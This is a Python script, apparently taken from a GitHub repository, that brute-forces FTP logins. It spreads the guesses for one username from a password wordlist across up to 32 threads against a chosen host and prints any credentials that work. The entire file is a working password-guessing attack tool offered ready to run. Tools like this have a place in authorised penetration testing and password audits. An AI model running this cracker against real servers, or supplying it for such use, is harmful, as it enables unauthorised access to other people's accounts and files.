#!/usr/bin/env python
# -*- coding: utf-8 -*-
# https://github.com/AniketBhunia/ftp-cracker/blob/main/ftp_cracker.py

import ftplib
import socket
import threading
import queue

# init the console for colors (for Windows)
from colorama import Fore, init
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor


# port of FTP
port = 21
threadLock = threading.Lock()


def connect_ftp(q, executor):
    global threadLock
    while not q.empty():
        # get the password from the queue
        password = q.get()

        # initialize the FTP server object
        server = ftplib.FTP()
        server.set_pasv(False)

        print("[!] Trying", password)
        try:
            # tries to connect to FTP server with a timeout of 5
            server.connect(host, port, timeout=5)
            welcome = server.getwelcome()
            # login using the credentials (user & password)
            server.login(user, password)
            server.quit()
        except TimeoutError:
            # timeout error
            print("Timed out: " + "password: " + password)
            pass
        except ftplib.error_perm:
            print("login failed, wrong credentials")
            pass
        else:
            threadLock.acquire()
            # correct credentials
            print(f"{Fore.GREEN}[+] Found credentials: ")
            print(f"\tHost: {host}")
            print(f"\tUser: {user}")
            print(f"\tPassword: {password}")
            print(f"\tWelcome messsage: {welcome}{Fore.RESET}")
            # we found the password, let's clear the queue
            threadLock.release()
            clear(q, executor)
        finally:
            # notify the queue that the task is completed for this password
            if q.empty() is not True:
                q.task_done()


def clear(q, executor):
    with q.mutex:
        q.queue.clear()
        q.all_tasks_done.notify_all()
        q.unfinished_tasks = 0
    # shutdown the executor
    executor.shutdown(wait=False, cancel_futures=True)


def range_type(astr, min=1, max=32):
    value = int(astr)
    if min <= value and value <= max:
        return value
    else:
        raise argparse.ArgumentTypeError("value not in range %s-%s" % (min, max))


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="FTP Cracker using Python")
    parser.add_argument("host", help="The target host or IP address of the FTP server")
    parser.add_argument("-u", "--user", help="The username of target FTP server", required=True)
    parser.add_argument("-p", "--passlist", help="The path of the pass list", required=True)
    parser.add_argument(
        "-t",
        "--threads",
        help="Number of workers to spawn for login, default is 30",
        default=30,
        type=range_type,
        metavar="[1-32]",
    )

    args = parser.parse_args()
    # hostname or IP address of the FTP server
    host = args.host
    # username of the FTP server, root as default for linux
    user = args.user
    passlist = args.passlist
    # number of threads to spawn
    n_threads = args.threads

    try:
        socket.gethostbyaddr(host)
    except socket.gaierror:
        print("Unknown host: " + host)
        exit(1)
    except socket.herror:
        print("Unable to resolve host: " + host)
        exit(2)

    # read the wordlist of passwords
    passwords = open(passlist).read().split("\n")

    print("[+] Passwords to try:", len(passwords))

    q = queue.Queue()
    q.put("")
    # put all passwords to the queue
    for password in passwords:
        q.put(password)

    with concurrent.futures.ThreadPoolExecutor(max_workers=n_threads) as executor:
        for i in range(q.qsize()):
            if q.qsize() != 0:
                executor.submit(connect_ftp, q, executor)

    # wait for the queue to be empty
    q.join()
